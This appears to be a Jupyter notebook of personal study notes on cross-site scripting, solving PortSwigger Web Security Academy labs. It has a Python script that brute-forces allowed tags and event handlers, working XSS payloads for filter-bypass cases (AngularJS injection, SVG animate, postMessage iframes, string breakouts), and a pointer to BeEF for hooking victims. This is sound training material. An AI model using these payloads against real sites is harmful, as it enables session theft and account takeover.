{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "----------------------------------------------------------------------------------\n",
    "                    # Cross Site Scripting Attacks (XSS)                                "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Used Resources:\n",
    "\n",
    ">> PortSwigger Labs:\n",
    "   - https://portswigger.net/web-security/cross-site-scripting\n",
    "\n",
    ">> Playlist:\n",
    "   - https://www.youtube.com/playlist?list=PLfnsjJ3BcOKw_tRI88eRQS9D1zHaKA0Dr\n",
    "   \n",
    ">> Arab Hack Sploit Video:\n",
    "   - https://www.youtube.com/watch?v=QBkFbOl9fqw&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=15\n",
    "   - https://www.youtube.com/watch?v=eM7xvAVtLrg&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=16\n",
    "   - https://www.youtube.com/watch?v=uM88xlt31qg&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=17"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Use beef-xss tool for hooking victims"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Some Details about the vulnerability:\n",
    "\n",
    ">> What is cross-site scripting (XSS)?\n",
    "   - Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.\n",
    "\n",
    ">> What are the types of XSS attacks?\n",
    "   - Reflected XSS, where the malicious script comes from the current HTTP request.\n",
    "   - Stored XSS, where the malicious script comes from the website's database.\n",
    "   - DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.\n",
    "   \n",
    ">> What can XSS be used for?\n",
    "   - Impersonate or masquerade as the victim user.\n",
    "   - Carry out any action that the user is able to perform.\n",
    "   - Read any data that the user is able to access.\n",
    "   - Capture the user's login credentials.\n",
    "   - Perform virtual defacement of the web site.\n",
    "   - Inject trojan functionality into the web site."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "burp0_url = \"https://0a170044039b311e8048a31100eb00be.web-security-academy.net:443/?search=%3Cscript%3Ealert%28%22ox%22%29%3C%2Fscript%3E\"\n",
    "burp0_cookies = {\"session\": \"3mHIcht3ZmgpAy6VRsVwZNy07fU7ol3F\"}\n",
    "burp0_headers = {\"Sec-Ch-Ua\": \"\\\"Chromium\\\";v=\\\"121\\\", \\\"Not A(Brand\\\";v=\\\"99\\\"\", \"Sec-Ch-Ua-Mobile\": \"?0\", \"Sec-Ch-Ua-Platform\": \"\\\"Linux\\\"\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"navigate\", \"Sec-Fetch-User\": \"?1\", \"Sec-Fetch-Dest\": \"document\", \"Referer\": \"https://0a170044039b311e8048a31100eb00be.web-security-academy.net/\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"en-US,en;q=0.9\", \"Priority\": \"u=0, i\"}\n",
    "\n",
    "html_tag = open('/home/ghost/Desktop/html_tag', 'r')\n",
    "event_tag = open('/home/ghost/Desktop/event_tag', 'r')\n",
    "\n",
    "for tag in html_tag:\n",
    "    burp0_url = f\"https://0a170044039b311e8048a31100eb00be.web-security-academy.net:443/?search=<{tag}>\"\n",
    "    response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)\n",
    "    \n",
    "    if (\"Tag is not allowed\") in response.text:\n",
    "        continue\n",
    "    else:\n",
    "        print(\"allowed tag is \" + tag)\n",
    "        \n",
    "        for event in event_tag:\n",
    "            burp0_url = f\"https://0a170044039b311e8048a31100eb00be.web-security-academy.net:443/?search=<{tag}+{event}>\"\n",
    "            response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)\n",
    "            \n",
    "            if (\"Event is not allowed\") in response.text:\n",
    "                continue\n",
    "            else:\n",
    "                print(f\"allowed attribute for this {tag} is\" + event)\n",
    "                \n",
    "\n",
    "print(f\"allowed code is <{tag} + {event}>\")\n",
    "html_tag.close()\n",
    "event_tag.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: Reflected XSS into HTML context with nothing encoded:\n",
    "\n",
    "payload on the search is (<script>prompt(\"o\")</script>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Stored XSS into HTML context with nothing encoded:\n",
    "\n",
    "payload on the comment tab is (<script>alert(1)</script>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: DOM XSS in document.write sink using source location.search:\n",
    "\n",
    "The payload palced on <img src=> in the JS code so to bypass it the payload will be \n",
    "(hi\"><script>prompt(1)</script><hi\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: DOM XSS in innerHTML sink using source location.search:\n",
    "\n",
    "The payload on the search tab is (<img src=x onerror=alert(1)>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: DOM XSS in jQuery anchor href attribute sink using location.search source:\n",
    "\n",
    "On the Submit Feedback page the parameter (/feedback?returnpath=) is vulnerable to xss\n",
    "The payload is (javascript:alert(1))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-6: DOM XSS in jQuery selector sink using a hashchange event:\n",
    "\n",
    "First open Exploit server then in the body section add the payload\n",
    "(<iframe src=\"https://Your_Lab_ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>)\n",
    "Then save and Send to the victim"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-7: Reflected XSS into attribute with angle brackets HTML-encoded:\n",
    "\n",
    "The payload is (x\" onmouseover=alert(1) \"x)\n",
    "the payload is (\" onmouseover=\"alert(1))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-8: Stored XSS into anchor href attribute with double quotes HTML-encoded:\n",
    "\n",
    "Type a comment and intercept the request and the response to see where the Typed words are palaced in the code.\n",
    "You'll see that the name is placed in (href) tag \n",
    "So the payload is (x\" onclick=\"alert(1))\n",
    "So the payload is (javascript:alert(1)) in the website box"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-9: Reflected XSS into a JavaScript string with angle brackets HTML encoded:\n",
    "\n",
    "search for events that can be put in the \"script tag\"\n",
    "the payload is ('; alert(1); ')\n",
    "The payload is ('-alert(1)-')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-10: DOM XSS in document.write sink using source location.search inside a select element:\n",
    "\n",
    "The Vuln in this page is the Check stock Function that make a new option from the URl\n",
    "On the URL add \"&storeId=anyname\" \n",
    "you'll see that \"anyname\" will appear in the box of Check stock\n",
    "so the payload will be (&storeId=<script>alert(1)</script>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded:\n",
    "\n",
    "The payload is ({{constructor.constructor('alert(1)')()}})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Lab-14: Reflected XSS into HTML context with most tags and attributes blocked:\n",
    "\n",
    "Here we need to brute force the tags to get unblocked tag \"it's body tag\"\n",
    "and brute force the attributes to get unblocked attribute \"it's onresize\"\n",
    "The payload is (<body onresize=print()>)\n",
    "open the exploit server and type (<iframe src=https://YOUR_LAB_ID.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E onload=this.style.width='100px'>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Reflected XSS with event handlers and href attributes blocked:\n",
    "\n",
    "The payload is \n",
    "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Reflected XSS with some SVG markup allowed:\n",
    "\n",
    "The payload is (\"><svg><animatetransform onbegin=alert(1)>)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Reflected XSS in canonical link tag:\n",
    "\n",
    "The payload on the home link is ('accesskey='x'onclick='alert(1))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped:\n",
    "\n",
    "The reflected object here is put in <script> tags so close it then write your payload\n",
    "The payload is (</script><script>alert(1)</script>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:\n",
    "\n",
    "here the is put in <script> tags so escaping the search variable by (\\) then comment the rest of the code by (//)\n",
    "The payload is (\\'; alert(1); //)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped:\n",
    "\n",
    "your web link put in 'onclick' to escape it we need to close the tags and comment the rest of the code by (//)\n",
    "so the payload is (http://web.com');alert(1)//)\n",
    "by html encoding of (')\n",
    "so the payload is (http://web.com&#x27);alert(1)//)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: DOM XSS using web message:\n",
    "\n",
    "the Vuln here is in a function of the home page that takes a message and run it\n",
    "\n",
    "The payload is (<iframe src=\"https://0a730090049d916880c2eeb9002400b7.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('<img src=x onerror=print(1)>','*')\">)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: DOM XSS using web messages and a JavaScript URL:\n",
    "\n",
    "The vuln here is in a function in the home page that takes a message and run it\n",
    "\n",
    "The payload is (<iframe src=\"https://0a69008c03c1938280996ce6009a0047.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('javascript:print(1)//https:','*')\">)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Lab: DOM XSS using web messages and JSON.parse:\n",
    "\n",
    "<iframe src=https://0abe004e045c0cb18a54b58f0002004e.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\"type\\\":\\\"load-channel\\\",\\\"url\\\":\\\"javascript:print(1)\\\"}\",\"*\")'>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
